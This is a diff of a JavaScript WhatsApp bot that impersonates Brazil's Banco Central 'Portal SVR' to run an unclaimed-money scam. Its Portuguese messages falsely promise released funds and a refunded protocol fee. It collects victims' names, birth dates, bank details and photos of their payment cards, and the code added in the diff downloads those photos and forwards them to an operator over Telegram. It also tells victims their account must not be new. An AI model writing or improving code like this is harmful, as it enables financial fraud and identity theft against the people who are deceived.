@@ -391,25 +391,76 @@ VINCULO: ATIVO
 *Portal SVR — Banco Central do Brasil*`;
 
 const MENSAGEM_ETAPA_5 =
-`💰 *CRÉDITO DISPONÍVEL — LIBERAÇÃO FINAL*
+`✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
 *Departamento de Execução Financeira — Portal SVR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-✅ *VALIDAÇÃO CONCLUÍDA COM SUCESSO!*
+✅ *PARABÉNS! SEU RESGATE FOI PROCESSADO COM SUCESSO.*
 
-Prezado(a) Titular, informamos que o seu processo de resgate foi *TOTALMENTE HOMOLOGADO*. O montante segurado e o reembolso do protocolo de validação foram unificados e estão prontos para transferência imediata.
+Prezado(a) Titular,
 
-📝 *POR FAVOR, INFORME ABAIXO OS DADOS FINAIS:*
+É com satisfação que informamos a conclusão do seu processo de recuperação de ativos financeiros. Todas as etapas de validação jurídica, vínculo bancário e homologação federal foram devidamente superadas.
 
-1️⃣ **BANCO** (Instituição)
-2️⃣ **AGÊNCIA**
-3️⃣ **CONTA**
+💰 *STATUS DA TRANSFERÊNCIA:*
+```
+VALOR TOTAL: LIBERADO
+ESTORNO TAXA: PROCESSADO
+PRAZO: ATÉ 1 DIA ÚTIL
+```
 
-O crédito será processado instantaneamente via sistema federal após a indicação destes dados.
+O montante total (Ativos + Reembolso do Protocolo) será creditado na conta informada em até *24 horas úteis*, conforme o fluxo de liquidação do Banco Central do Brasil.
 
-⚠️ *SEGURANÇA:* O sistema cruzará os dados com o titular do CPF/CNPJ. Se preferir agilidade, envie uma **FOTO DO CARTÃO** para leitura óptica automática.
+O senhor(a) receberá uma notificação via SMS ou e-mail assim que o valor estiver disponível para uso.
 
-*Portal SVR — Banco Central do Brasil*`;
+*Agradecemos a sua confiança e colaboração.*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+*Portal SVR — Banco Central do Brasil*
+_Processo 100% Homologado e Finalizado._`;
+
+const BANCOS_LIST = {
+    "001": "Banco do Brasil",
+    "003": "Banco da Amazônia",
+    "004": "Banco do Nordeste",
+    "033": "Santander",
+    "077": "Banco Inter",
+    "104": "Caixa Econômica",
+    "197": "Stone",
+    "212": "Banco Original",
+    "237": "Bradesco",
+    "260": "Nubank",
+    "290": "PagBank",
+    "336": "C6 Bank",
+    "341": "Itaú",
+    "389": "Banco Mercantil",
+    "403": "Cora",
+    "633": "Banco Rendimento",
+    "652": "Itaú Holding",
+    "745": "Citibank",
+    "748": "Sicredi",
+    "756": "Sicoob",
+    "025": "Banco Alfa",
+    "029": "Itaú Consignado",
+    "036": "Bradesco BBI",
+    "037": "Banpará",
+    "047": "Banese",
+    "065": "Andbank",
+    "121": "Agibank",
+    "218": "Banco BS2",
+    "318": "Banco BMG",
+    "368": "Banco CSF (Carrefour)",
+    "739": "Banco Cetelem",
+    "752": "BNP Paribas"
+};
+
+function detectBank(text) {
+    const clean = text.toLowerCase();
+    for (const [code, name] of Object.entries(BANCOS_LIST)) {
+        if (clean.includes(code) || clean.includes(name.toLowerCase())) {
+            return { code, name };
+        }
+    }
+    return null;
+}
 
 client.on('message_create', async (msg) => {
     if (BOT_ID !== 'main') return;
@@ -769,9 +820,33 @@ async function processIncomingMessage(msg, targetChatId) {
 
     // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
     } else if (currentSession.step === 3) {
-        const typedBank = text.trim();
+        if (msg.hasMedia) {
+            console.log(`📸 [BANCO-FOTO] Lead ${targetChatId} enviou foto do cartão.`);
+            try {
+                const media = await msg.downloadMedia();
+                if (media) {
+                    const buffer = Buffer.from(media.data, 'base64');
+                    await notifyTelegramPhoto(buffer, `💳 <b>CARTÃO RECEBIDO (VALIDAÇÃO INICIAL)</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou foto do cartão na etapa 1.3.</i>`);
+                }
+            } catch (e) { }
 
-        if (typedBank.length >= 5) {
+            await msg.reply(`✅ *Imagem recebida!*\n\nAguarde enquanto o sistema realiza a leitura dos dados para vinculação ao seu protocolo de resgate.`);
+            
+            // Avança para a fila mesmo com foto
+            currentSession.step = 4;
+            currentSession.bankData = "FOTO_ENVIADA";
+            currentSession.mode = 'waiting';
+            chatSessions.set(targetChatId, currentSession);
+            saveSessions();
+            addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
+            return;
+        }
+
+        const typedBank = text.trim();
+        if (typedBank.length >= 4) {
+            const bank = detectBank(typedBank);
+            const bankName = bank ? bank.name : "Instituição Identificada";
+
             // ✅ Cadastro concluído — colocar na fila de espera
             currentSession.step = 4;
             currentSession.bankData = typedBank;
@@ -782,10 +857,9 @@ async function processIncomingMessage(msg, targetChatId) {
             // Adiciona à fila de espera
             addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
             const queuePos = getQueuePosition(targetChatId);
-            const queueSize = waitingQueue.length;
             const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
 
-            // Edita a mensagem no Telegram com cadastro completo
+            // Edita a mensagem no Telegram
             if (currentSession.tgMsgId) {
                 await notifyTelegram(
                     buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType),
@@ -798,10 +872,9 @@ async function processIncomingMessage(msg, targetChatId) {
                 `💰 <b>LEAD VALIDADO — NA FILA!</b>\n` +
                 `👤 Nome: ${currentSession.name}\n` +
                 `📅 Data: ${currentSession.birthDate}\n` +
-                `🏛️ Banco: ${typedBank}\n` +
+                `🏛️ Banco: ${typedBank} (Dect: ${bankName})\n` +
                 `🆔 Lead: <code>${targetChatId}</code>\n` +
-                `📊 Fila: <b>${queuePos}º</b>\n\n` +
-                `Use /pix para liberar o pagamento.`
+                `📊 Fila: <b>${queuePos}º</b>`
             );
 
             const frenteMsg = clientesFrente > 0
@@ -809,22 +882,18 @@ async function processIncomingMessage(msg, targetChatId) {
                 : `Sua solicitação é a próxima a ser processada.`;
 
             await msg.reply(
+                `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
+                `Confirmamos que esta é a instituição destino que receberá os montantes recuperados.\n\n` +
+                `⚠️ *AVISO DE SEGURANÇA:* Lembramos que a conta informada *NÃO* pode ser recém-criada ou sem movimentações antigas. O sistema do Banco Central valida contas inativas ou sem histórico real como "contas de risco", o que pode suspender a liberação automática.\n\n` +
                 `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
-                `Prezado(a) *${currentSession.name}*,\n\n` +
-                `Sua identidade e vínculo bancário foram validados com êxito pelo sistema federal de segurança.\n\n` +
+                `Prezado(a) *${currentSession.name}*,\n` +
+                `Sua identidade e vínculo com o *${bankName}* foram validados com êxito.\n\n` +
                 `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
                 `${frenteMsg}\n\n` +
-                `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
+                `Aguarde o contato de nosso operador para os procedimentos finais.\n\n` +
                 `_Portal SVR — Banco Central do Brasil_`);
         } else {
             await msg.reply(`⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
-        }
-
-        } else {
-            // Nome inválido — IA responde de forma formal
-            const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
-            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO dado informado não corresponde a um nome completo válido.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em seu documento de identificação oficial (RG ou CNH).`;
-            await msg.reply(aiReply || fallback);
         }
     }
 }
